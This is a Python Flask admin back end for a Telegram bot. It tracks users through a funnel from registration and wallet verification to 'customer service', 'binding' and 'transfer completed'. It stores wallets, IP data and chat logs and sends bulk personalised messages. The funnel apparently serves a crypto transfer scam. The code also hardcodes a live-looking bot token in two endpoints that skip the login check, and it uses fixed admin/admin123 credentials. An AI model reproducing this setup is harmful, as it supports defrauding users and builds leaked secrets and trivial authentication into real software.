#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Telegram Bot 管理后台
功能：
1. 用户管理
2. 消息推送
3. 广告管理
4. 数据分析
"""

import os
import sys
import json
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from flask_session import Session
import requests
from dotenv import load_dotenv

# 统一日志：控制台 + 滚动文件
logs_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'logs')
os.makedirs(logs_dir, exist_ok=True)

logger = logging.getLogger('flask_app')
logger.setLevel(logging.INFO)

if not logger.handlers:
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)
    file_handler = RotatingFileHandler(os.path.join(logs_dir, 'flask_app.log'), maxBytes=2*1024*1024, backupCount=3, encoding='utf-8')
    file_handler.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    console_handler.setFormatter(formatter)
    file_handler.setFormatter(formatter)
    logger.addHandler(console_handler)
    logger.addHandler(file_handler)

# 添加父目录到路径，以便导入 database_manager
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# 加载环境变量
load_dotenv()

# 导入数据库管理器
try:
    # 设置数据库文件路径为项目根目录
    import database_manager
    # 保存原始构造函数
    original_init = database_manager.DatabaseManager.__init__
    
    # 重新定义构造函数，使用项目根目录的数据库（与Bot共享）
    def new_init(self, db_path=None):
        if db_path is None:
            # 使用项目根目录的数据库文件（与Bot共享）
            project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            db_path = os.path.join(project_root, 'user_data.db')
            print(f"📁 Flask使用数据库路径: {db_path}")
        original_init(self, db_path)
    
    # 替换构造函数
    database_manager.DatabaseManager.__init__ = new_init
    
    from database_manager import get_database
    db = get_database()
    print("✅ 数据库管理器导入成功")
except Exception as e:
    print(f"❌ 数据库管理器导入失败: {e}")
    import traceback
    traceback.print_exc()
    # 创建一个假数据库对象
    class FakeDB:
        def get_all_users(self): return []
        def save_user(self, user_id, data): pass
        def get_user(self, user_id): return None
        def save_conversation(self, user_id, role, content): pass
        def get_conversations(self, user_id, limit=100): return []
        def get_wallet_info(self, user_id): return None
    db = FakeDB()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
app.config['SESSION_TYPE'] = 'filesystem'
Session(app)

# 注册自定义Jinja2过滤器
@app.template_filter('from_json')
def from_json_filter(value):
    """将JSON字符串转换为Python对象"""
    if not value:
        return {}
    try:
        return json.loads(value)
    except:
        return {}

# 初始化数据库（启动时执行）
try:
    users = db.get_all_users()
    logger.info(f"✅ 数据库已加载，当前有 {len(users)} 个用户")
except Exception as e:
    logger.error(f"❌ 数据库加载失败: {e}")
    import traceback
    traceback.print_exc()

# 配置
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')

# ==================== 工具函数 ====================

def load_sessions():
    """从数据库加载用户会话数据"""
    try:
        users = db.get_all_users()
        sessions = {}
        
        for user_data in users:
            user_id = user_data['user_id']
            sessions[user_id] = {
                'language': user_data.get('language', 'zh'),
                'state': user_data.get('state', 'idle'),
                'username': user_data.get('username'),
                'first_name': user_data.get('first_name'),
                'last_name': user_data.get('last_name'),
                'wallet': user_data.get('wallet'),
                'note': user_data.get('note'),
                'transfer_completed': bool(user_data.get('transfer_completed', 0)),
                'avatar_url': user_data.get('avatar_url'),
                'ip_info': user_data.get('ip_info')
            }
        
        return sessions
    except Exception as e:
        logger.error(f"加载会话失败: {e}")
        return {}

def save_sessions(sessions):
    """保存用户会话数据到数据库"""
    try:
        for user_id, session_data in sessions.items():
            user_info = {
                'username': session_data.get('username'),
                'first_name': session_data.get('first_name'),
                'last_name': session_data.get('last_name'),
                'language': session_data.get('language', 'zh'),
                'state': session_data.get('state', 'idle'),
                'wallet': session_data.get('wallet'),
                'note': session_data.get('note'),
                'transfer_completed': session_data.get('transfer_completed', False)
            }
            db.save_user(user_id, user_info)
    except Exception as e:
        logger.error(f"保存会话失败: {e}")

def send_telegram_message(user_id, message):
    """发送Telegram消息"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': user_id,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"发送消息失败: {e}")
        return False

# ==================== 路由 ====================

@app.route('/')
def index():
    """主页"""
    return redirect(url_for('users'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    """登录"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # 简单验证（你可以设置自己的账号密码）
        if username == 'admin' and password == 'admin123':
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error='用户名或密码错误')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """登出"""
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    """仪表盘"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    sessions = load_sessions()
    total_users = len(sessions)
    
    # 统一状态集合
    waiting_cs = sum(1 for u in sessions.values() if u.get('state') in ['waiting_customer_service', 'waiting'])
    bound_ready = sum(1 for u in sessions.values() if u.get('state') in ['bound_and_ready', 'bound', 'completed'])
    wallet_verified = sum(1 for u in sessions.values() if u.get('state') in ['wallet_verified', 'verified'])
    transfer_done = sum(1 for u in sessions.values() if u.get('transfer_completed', False))
    
    # 详细统计
    stats = {
        'total_users': total_users,
        'new_users_today': total_users,
        'pending_messages': waiting_cs,
        'active_sessions': total_users,
        'waiting_service': waiting_cs,
        'bound': bound_ready,
        'wallet_checked': wallet_verified,
        'wallet_verified': wallet_verified
    }
    
    # 最近10个用户（保持不变，略）
    recent_users = []
    for user_id, user_data in list(sessions.items())[:10]:
        recent_users.append({
            'user_id': user_id,
            'username': user_data.get('username', 'N/A'),
            'language': user_data.get('language', 'zh'),
            'state': user_data.get('state', 'idle'),
            'created_at': None
        })
    
    # 转化漏斗
    funnel = {
        'step1_registered': total_users,
        'step2_wallet_created': wallet_verified + bound_ready,
        'step3_waiting_service': waiting_cs,
        'step4_bound': bound_ready,
        'step5_transfer_completed': transfer_done,
    }
    
    return render_template('dashboard_tailwind.html', 
                         stats=stats, 
                         recent_users=recent_users, 
                         funnel=funnel,
                         users=load_sessions(),
                         active_users=stats['active_sessions'],
                         today_users=stats['new_users_today'],
                         completed_count=transfer_done)

@app.route('/api/funnel')
def api_funnel():
    if not session.get('logged_in'):
        return jsonify({'success': False}), 401
    sessions = load_sessions()
    total = len(sessions)
    waiting_cs = sum(1 for u in sessions.values() if u.get('state') in ['waiting_customer_service', 'waiting'])
    bound_ready = sum(1 for u in sessions.values() if u.get('state') in ['bound_and_ready', 'bound', 'completed'])
    wallet_verified = sum(1 for u in sessions.values() if u.get('state') in ['wallet_verified', 'verified'])
    transfer_done = sum(1 for u in sessions.values() if u.get('transfer_completed', False))
    return jsonify({'success': True, 'funnel': {
        'registered': total,
        'wallet': wallet_verified + bound_ready,
        'waiting_service': waiting_cs,
        'bound': bound_ready,
        'transfer_completed': transfer_done,
    }})

@app.route('/analytics')
def analytics():
    """数据分析页面"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    sessions = load_sessions()
    
    # 状态分布统计
    state_distribution = {}
    for user_data in sessions.values():
        state = user_data.get('state', 'unknown')
        state_distribution[state] = state_distribution.get(state, 0) + 1
    
    # 语言分布
    language_distribution = {}
    for user_data in sessions.values():
        lang = user_data.get('language', 'unknown')
        language_distribution[lang] = language_distribution.get(lang, 0) + 1
    
    # 转化率计算
    total = len(sessions)
    if total > 0:
        # 统一状态统计
        wallet_bound = sum(1 for u in sessions.values() if u.get('wallet'))
        waiting_cs = sum(1 for u in sessions.values() if u.get('state') in ['waiting_customer_service', 'waiting'])
        bound_ready = sum(1 for u in sessions.values() if u.get('state') in ['bound_and_ready', 'bound', 'completed'])
        transfer_completed = sum(1 for u in sessions.values() if u.get('transfer_completed', False))
        
        conversion_rates = {
            'to_wallet': (wallet_bound / total * 100) if total else 0,
            'to_service': (waiting_cs / total * 100) if total else 0,
            'to_bound': (bound_ready / total * 100) if total else 0,
            'to_transfer': (transfer_completed / total * 100) if total else 0
        }
    else:
        conversion_rates = {'to_wallet': 0, 'to_service': 0, 'to_bound': 0, 'to_transfer': 0}
    
    # 最近24小时活跃用户（简化版）
    recent_users = sum(1 for user_data in sessions.values() if user_data.get('created_at'))
    
    analytics_data = {
        'state_distribution': state_distribution,
        'language_distribution': language_distribution,
        'conversion_rates': conversion_rates,
        'recent_users': recent_users,
        'total_users': total
    }
    
    return render_template('analytics_tailwind.html', data=analytics_data)

@app.route('/users')
def users():
    """用户列表"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    sessions = load_sessions()
    users_list = []
    
    # 获取筛选条件
    filter_state = request.args.get('state', '')
    filter_date = request.args.get('date', '')  # all/today/week/month
    filter_activity = request.args.get('activity', '')  # active3d/active7d/active30d
    
    # 计算时间范围
    now = datetime.now()
    date_filter = None
    if filter_date == 'today':
        date_filter = now.replace(hour=0, minute=0, second=0, microsecond=0)
    elif filter_date == 'week':
        date_filter = now - timedelta(days=7)
    elif filter_date == 'month':
        date_filter = now - timedelta(days=30)
    
    activity_filter = None
    if filter_activity == 'active3d':
        activity_filter = now - timedelta(days=3)
    elif filter_activity == 'active7d':
        activity_filter = now - timedelta(days=7)
    elif filter_activity == 'active30d':
        activity_filter = now - timedelta(days=30)
    
    for user_id, data in sessions.items():
        user_state = data.get('state', 'unknown')
        
        # 如果指定了状态筛选，只显示匹配的用户
        if filter_state and user_state != filter_state:
            continue
        
        # 日期筛选（基于created_at）
        if date_filter:
            created_at = data.get('created_at')
            if created_at:
                try:
                                        # 如果created_at是字符串，需要解析
                    if isinstance(created_at, str):
                        created_at = datetime.strptime(created_at, '%Y-%m-%d %H:%M:%S')
                    if created_at < date_filter:
                        continue
                except:
                    pass
        
        # 活动时间筛选（基于conversations表中的最新对话）
        if activity_filter:
            try:
                # 从数据库获取该用户最新对话时间
                conversations = db.get_conversations(user_id, limit=1)
                if conversations and len(conversations) > 0:
                    last_time = conversations[-1].get('timestamp')
                    if isinstance(last_time, str):
                        last_time = datetime.strptime(last_time, '%Y-%m-%d %H:%M:%S')
                    if last_time < activity_filter:
                        continue
                else:
                    # 没有对话记录，跳过
                    continue
            except:
                pass
            
        users_list.append({
            'user_id': user_id,
            'username': data.get('username', 'N/A'),
            'wallet': data.get('wallet', ''),
            'note': data.get('note', ''),
            'state': user_state,
            'language': data.get('language', 'zh'),
            'transfer_completed': data.get('transfer_completed', False),
            'avatar_url': data.get('avatar_url'),
            'ip_info': data.get('ip_info'),
            'created_at': data.get('created_at')
        })
    
    # 服务端分页
    try:
        page = max(1, int(request.args.get('page', '1') or '1'))
        per_page = min(100, max(5, int(request.args.get('per_page', '20') or '20')))
    except ValueError:
        page, per_page = 1, 20
    total = len(users_list)
    total_pages = max(1, (total + per_page - 1) // per_page)
    start = (page - 1) * per_page
    end = start + per_page
    users_page = users_list[start:end]
    pagination = {
        'page': page,
        'per_page': per_page,
        'total': total,
        'total_pages': total_pages,
        'has_prev': page > 1,
        'has_next': page < total_pages,
    }
    return render_template('users_tailwind.html', users=users_page, filter_state=filter_state, pagination=pagination)

@app.route('/user/<int:user_id>/delete', methods=['POST'])
def delete_user(user_id):
    """删除用户"""
    if not session.get('logged_in'):
        return jsonify({'success': False, 'error': 'Not logged in'})
    
    try:
        # 使用database_manager的_execute方法删除用户
        db._execute("DELETE FROM users WHERE user_id = ?", (user_id,))
        
        # 同时删除相关的对话记录
        try:
            db._execute("DELETE FROM conversations WHERE user_id = ?", (user_id,))
        except:
            pass  # 如果表不存在或删除失败，继续
        
        # 删除钱包信息
        try:
            db._execute("DELETE FROM wallet_info WHERE user_id = ?", (user_id,))
        except:
            pass  # 如果表不存在或删除失败，继续
            
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"删除用户失败: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/user/<int:user_id>')
def user_detail(user_id):
    """用户详情"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    # 从数据库获取用户信息
    user_data = db.get_user(user_id)
    
    if not user_data:
        return "用户不存在", 404
    
    # 获取对话历史
    try:
        conversations = db.get_conversations(user_id, limit=100)
        user_data['history'] = conversations
    except Exception as e:
        logger.error(f"获取对话历史失败: {e}")
        user_data['history'] = []
    
    # 获取钱包信息
    try:
        wallet_info = db.get_wallet_info(user_id)
        if wallet_info:
            user_data['wallet_info'] = wallet_info
    except Exception as e:
        logger.error(f"获取钱包信息失败: {e}")
        user_data['wallet_info'] = {}
    
    # 转换为模板需要的格式
    user_data_dict = {
        'language': user_data.get('language', 'zh'),
        'state': user_data.get('state', 'idle'),
        'username': user_data.get('username'),
        'first_name': user_data.get('first_name'),
        'last_name': user_data.get('last_name'),
        'wallet': user_data.get('wallet'),
        'note': user_data.get('note'),
        'transfer_completed': bool(user_data.get('transfer_completed', 0)),
        'history': user_data.get('history', []),
        'wallet_info': user_data.get('wallet_info', {})
    }
    
    return render_template('user_detail_tailwind.html', user_id=user_id, user_data=user_data_dict)

@app.route('/user/<int:user_id>/history')
def user_history(user_id):
    """返回用户对话历史（JSON），按时间升序"""
    if not session.get('logged_in'):
        return jsonify({'success': False, 'error': 'Not logged in'}), 401
    try:
        conversations = db.get_conversations(user_id, limit=200)
        logger.info(f"[HISTORY] fetch {user_id} -> {len(conversations)} rows")
        # 合并旧 sessions 历史，避免因Bot未入库导致缺失
        sessions = load_sessions()
        sessions_hist = (sessions.get(user_id, {}) or {}).get('history', [])
        logger.info(f"[HISTORY] sessions -> {len(sessions_hist)} rows")
        merged = []
        # 标准化结构
        for m in conversations:
            merged.append({'role': m.get('role'), 'content': m.get('content'), 'timestamp': m.get('timestamp')})
        for m in sessions_hist:
            merged.append({'role': m.get('role'), 'content': m.get('content'), 'timestamp': m.get('timestamp')})
        # 去重（按 role+content 相同视为重复），并按内容长度+顺序保留
        seen = set()
        dedup = []
        for m in merged:
            key = (m.get('role'), m.get('content'))
            if key in seen:
                continue
            seen.add(key)
            dedup.append(m)
        # 排序：无timestamp的放前，再按timestamp升序
        def sort_key(m):
            return (0 if not m.get('timestamp') else 1, str(m.get('timestamp')))
        dedup.sort(key=sort_key)
        return jsonify({'success': True, 'history': dedup[-200:]})
    except Exception as e:
        logger.error(f"[HISTORY][ERROR] {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/user/<int:user_id>/update', methods=['POST'])
def update_user(user_id):
    """更新用户信息"""
    if not session.get('logged_in'):
        return jsonify({'success': False, 'error': 'Not logged in'})
    
    sessions = load_sessions()
    if user_id not in sessions:
        return jsonify({'success': False, 'error': 'User not found'})
    
    data = request.json
    note = data.get('note', '')
    wallet = data.get('wallet', '')
    
    if note:
        sessions[user_id]['note'] = note
    if wallet:
        sessions[user_id]['wallet'] = wallet
    
    save_sessions(sessions)
    
    return jsonify({'success': True})

@app.route('/user/<int:user_id>/send-message', methods=['POST'])
def send_user_message(user_id):
    """发送消息给指定用户"""
    if not session.get('logged_in'):
        return jsonify({'success': False, 'error': 'Not logged in'})
    
    data = request.json
    message = data.get('message', '')
    
    if not message:
        return jsonify({'success': False, 'error': 'Message is empty'})
    
    # 发送消息
    if send_telegram_message(user_id, message):
        # 写入数据库会话历史，保持与Bot一致
        try:
            db.save_conversation(user_id, 'assistant', message)
        except Exception as e:
            logger.error(f"保存管理员发送对话失败: {e}")
        return jsonify({'success': True})
    else:
        return jsonify({'success': False, 'error': 'Failed to send message'})

@app.route('/push', methods=['GET', 'POST'])
def push():
    """消息推送"""
    if request.method == 'POST' and not session.get('logged_in'):
        return jsonify({'success': False, 'error': 'Not logged in'}), 401
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    sessions = load_sessions()
    
    if request.method == 'POST':
        message = request.form.get('message')
        target_type = request.form.get('target_type', 'all')
        target_users = request.form.get('target_users', '')  # 指定用户ID
        
        if not message or not message.strip():
            return jsonify({'success': False, 'error': '消息内容不能为空'}), 400
        
        sent_count = 0
        failed_count = 0
        
        # 确定要发送的用户列表
        user_list = []
        
        if target_type == 'selected' and target_users:
            # 精确推送：指定用户ID
            for user_id_str in target_users.split(','):
                try:
                    user_id = int(user_id_str.strip())
                    if user_id in sessions:
                        user_list.append(user_id)
                except ValueError:
                    pass
        elif target_type == 'all':
            # 全部用户（真实互动过的）
            user_list = [uid for uid, data in sessions.items() 
                        if data.get('username') or data.get('first_name') or data.get('note')]
        elif target_type == 'idle':
            # 初始化用户
            for user_id, data in sessions.items():
                if data.get('state') in ['idle', 'init']:
                    user_list.append(user_id)
        elif target_type == 'wallet_waiting':
            # 等待钱包用户
            for user_id, data in sessions.items():
                if data.get('state') in ['waiting_wallet', 'wallet_waiting']:
                    user_list.append(user_id)
        elif target_type == 'verified':
            # 已验证用户
            for user_id, data in sessions.items():
                if data.get('state') in ['wallet_verified', 'verified']:
                    user_list.append(user_id)
        elif target_type == 'waiting':
            # 等待客服的用户
            for user_id, data in sessions.items():
                if data.get('state') in ['waiting_customer_service', 'waiting']:
                    user_list.append(user_id)
        elif target_type == 'bound':
            # 已绑定的用户
            for user_id, data in sessions.items():
                if data.get('state') in ['bound_and_ready', 'bound', 'completed']:
                    user_list.append(user_id)
        
        # 如果没有用户，返回错误
        if not user_list:
            return jsonify({'success': False, 'error': f'未找到符合条件的用户（筛选类型: {target_type}）'}), 400
        
        # 发送消息
        results = []
        for user_id in user_list:
            user_data = sessions.get(user_id, {})
            
            # 替换变量
            personalized_msg = message
            personalized_msg = personalized_msg.replace('{username}', user_data.get('username', '用户'))
            personalized_msg = personalized_msg.replace('{wallet}', user_data.get('wallet', 'N/A'))
            personalized_msg = personalized_msg.replace('{user_id}', str(user_id))
            
            try:
                if send_telegram_message(user_id, personalized_msg):
                    sent_count += 1
                    results.append({'user_id': user_id, 'status': 'success'})
                else:
                    failed_count += 1
                    results.append({'user_id': user_id, 'status': 'failed', 'error': 'Telegram API返回失败'})
            except Exception as e:
                logger.error(f"发送消息给用户 {user_id} 失败: {e}")
                import traceback
                traceback.print_exc()
                failed_count += 1
                results.append({'user_id': user_id, 'status': 'failed', 'error': str(e)})
        
        # 保存推送记录
        push_record = {
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'message': message,
            'target_type': target_type,
            'total': len(user_list),
            'sent': sent_count,
            'failed': failed_count
        }
        
        # 保存到本地文件（简单记录）
        try:
            push_log_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            push_log_file = os.path.join(push_log_dir, 'push_history.json')
            with open(push_log_file, 'a', encoding='utf-8') as f:
                f.write(json.dumps(push_record, ensure_ascii=False) + '\n')
        except Exception as e:
            logger.error(f"保存推送记录失败: {e}")
        
        # 返回JSON结果，而不是渲染模板
        return jsonify({
            'success': True,
            'sent': sent_count,
            'failed': failed_count,
            'total': len(user_list),
            'results': results,
            'message': f'成功发送 {sent_count}/{len(user_list)} 条消息'
        })
    
    # GET请求：渲染推送页面
    # 获取各个状态的用户数量（真实用户，排除只初始化未互动的）
    valid_sessions = {uid: data for uid, data in sessions.items() 
                      if data.get('username') or data.get('first_name') or data.get('note')}
    
    stats = {
        'all': len(valid_sessions),  # 只统计真实互动过的用户
        'waiting': sum(1 for u in valid_sessions.values() if u.get('state') in ['waiting_customer_service', 'waiting']),
        'bound': sum(1 for u in valid_sessions.values() if u.get('state') in ['bound_and_ready', 'bound', 'completed']),
        'transfer_completed': sum(1 for u in valid_sessions.values() if u.get('transfer_completed', False)),
        'idle': sum(1 for u in valid_sessions.values() if u.get('state') in ['idle', 'init']),
        'verified': sum(1 for u in valid_sessions.values() if u.get('state') in ['wallet_verified', 'verified']),
        'wallet_waiting': sum(1 for u in valid_sessions.values() if u.get('state') in ['waiting_wallet', 'wallet_waiting'])
    }
    
    return render_template('push_tailwind.html', stats=stats, users=valid_sessions)

@app.route('/ad', methods=['GET', 'POST'])
def ad():
    """广告管理"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    return render_template('ad.html')

@app.route('/stats')
def stats():
    """数据统计"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    sessions = load_sessions()
    
    # 统计信息
    stats = {
        'total': len(sessions),
        'by_state': {},
        'by_language': {}
    }
    
    for user_data in sessions.values():
        state = user_data.get('state', 'unknown')
        lang = user_data.get('language', 'unknown')
        stats['by_state'][state] = stats['by_state'].get(state, 0) + 1
        stats['by_language'][lang] = stats['by_language'].get(lang, 0) + 1
    
    return render_template('stats.html', stats=stats)

@app.route('/api/bot-health')
def bot_health():
    """检查Bot健康状态"""
    import requests
    try:
        resp = requests.get('https://api.telegram.org/bot7751111095:AAGy0YC7sVndtxboAaKYm1P_WPDsip9XVx0/getMe', timeout=3)
        data = resp.json()
        return jsonify({'ok': data.get('ok', False), 'result': data.get('result', {})})
    except:
        return jsonify({'ok': False})

@app.route('/api/system-stats')
def system_stats():
    """系统统计（Bot状态、数据库状态）"""
    import sqlite3
    stats = {
        'bot_online': False,
        'db_connected': False,
        'total_users': 0,
        'total_conversations': 0
    }
    
    # 检查Bot
    try:
        resp = requests.get('https://api.telegram.org/bot7751111095:AAGy0YC7sVndtxboAaKYm1P_WPDsip9XVx0/getMe', timeout=3)
        stats['bot_online'] = resp.json().get('ok', False)
    except:
        pass
    
    # 检查数据库
    try:
        project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        sqlite_path = os.path.join(project_root, 'user_data.db')
        conn = sqlite3.connect(sqlite_path)
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM users")
        stats['total_users'] = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM conversations")
        stats['total_conversations'] = cur.fetchone()[0]
        stats['db_connected'] = True
        conn.close()
    except:
        pass
    
    return jsonify(stats)

@app.route('/api/batch-update-state', methods=['POST'])
def batch_update_state():
    """批量更新用户状态"""
    if not session.get('logged_in'):
        return jsonify({'success': False, 'error': 'Not logged in'}), 401
    
    data = request.json
    user_ids = data.get('user_ids', [])
    new_state = data.get('state', '')
    
    if not user_ids or not new_state:
        return jsonify({'success': False, 'error': 'Invalid params'})
    
    updated = 0
    for user_id in user_ids:
        try:
            db._execute("UPDATE users SET state = ? WHERE user_id = ?", (new_state, user_id))
            updated += 1
        except:
            pass
    
    logger.info(f"批量更新状态: {updated}/{len(user_ids)}个用户 -> {new_state}")
    return jsonify({'success': True, 'updated': updated})

@app.route('/api/batch-send-message', methods=['POST'])
def batch_send_message():
    """批量发送消息"""
    if not session.get('logged_in'):
        return jsonify({'success': False, 'error': 'Not logged in'}), 401
    
    data = request.json
    user_ids = data.get('user_ids', [])
    message = data.get('message', '')
    
    if not user_ids or not message:
        return jsonify({'success': False, 'error': 'Invalid params'})
    
    sent = 0
    for user_id in user_ids:
        if send_telegram_message(user_id, message):
            try:
                db.save_conversation(user_id, 'assistant', message)
            except:
                pass
            sent += 1
    
    logger.info(f"批量发送消息: {sent}/{len(user_ids)}个用户")
    return jsonify({'success': True, 'sent': sent})

@app.route('/api/batch-delete', methods=['POST'])
def batch_delete():
    """批量删除用户"""
    if not session.get('logged_in'):
        return jsonify({'success': False, 'error': 'Not logged in'}), 401
    
    data = request.json
    user_ids = data.get('user_ids', [])
    
    if not user_ids:
        return jsonify({'success': False, 'error': 'Invalid params'})
    
    deleted = 0
    for user_id in user_ids:
        try:
            db._execute("DELETE FROM users WHERE user_id = ?", (user_id,))
            db._execute("DELETE FROM conversations WHERE user_id = ?", (user_id,))
            db._execute("DELETE FROM wallet_info WHERE user_id = ?", (user_id,))
            deleted += 1
        except:
            pass
    
    logger.info(f"批量删除: {deleted}/{len(user_ids)}个用户")
    return jsonify({'success': True, 'deleted': deleted})

if __name__ == '__main__':
    # 支持Railway和命令行两种启动方式
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port)

